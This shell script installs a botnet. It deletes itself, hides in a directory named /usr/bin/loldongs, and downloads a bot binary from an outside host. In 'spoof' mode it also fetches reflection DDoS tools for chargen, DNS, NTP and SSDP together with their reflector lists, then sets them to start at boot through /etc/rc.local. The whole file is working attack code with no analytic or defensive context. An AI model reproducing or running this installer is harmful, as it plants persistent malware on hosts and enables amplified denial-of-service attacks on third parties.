#!/bin/sh

# Check enough params have been passed
if [ $# == 0 ]; then
	echo -e "[\x1b[33m?\x1b[37m] Usage: $0 <reg || spoof>"
	exit 1
fi

# Delete this setup file
rm -f $0

# Make a directory that is out of sight
mkdir /usr/bin/loldongs/

# Download each file to our new directory
if [ $1 == "spoof" ]; then
	wget -q http://akablj.pw/dongs/chargen -O /usr/bin/loldongs/chargen
	wget -q http://akablj.pw/dongs/dns -O /usr/bin/loldongs/dns
	wget -q http://akablj.pw/dongs/ntp -O /usr/bin/loldongs/ntp
	wget -q http://akablj.pw/dongs/ssdp -O /usr/bin/loldongs/ssdp
	wget -q http://akablj.pw/dongs/chargen.txt -O /usr/bin/loldongs/chargen.txt
	wget -q http://akablj.pw/dongs/dns.txt -O /usr/bin/loldongs/dns.txt
	wget -q http://akablj.pw/dongs/ntp.txt -O /usr/bin/loldongs/ntp.txt
	wget -q http://akablj.pw/dongs/ssdp.txt -O /usr/bin/loldongs/ssdp.txt
	wget -q http://akablj.pw/dongs/gemini -O /usr/bin/loldongs/gemini
fi
wget -q http://akablj.pw/dongs/bot -O /usr/bin/loldongs/bot

# Mark files as executable
if [ $1 == "spoof" ]; then
	chmod +x /usr/bin/loldongs/chargen
	chmod +x /usr/bin/loldongs/dns
	chmod +x /usr/bin/loldongs/ntp
	chmod +x /usr/bin/loldongs/ssdp
	chmod +x /usr/bin/loldongs/gemini
fi
chmod +x /usr/bin/loldongs/bot

# Auto run the bot on reboot
cat /etc/rc.local | grep '/usr/bin/loldongs/bot' || sed -i '$e echo /usr/bin/loldongs/bot' /etc/rc.local

# Exit
exit 0

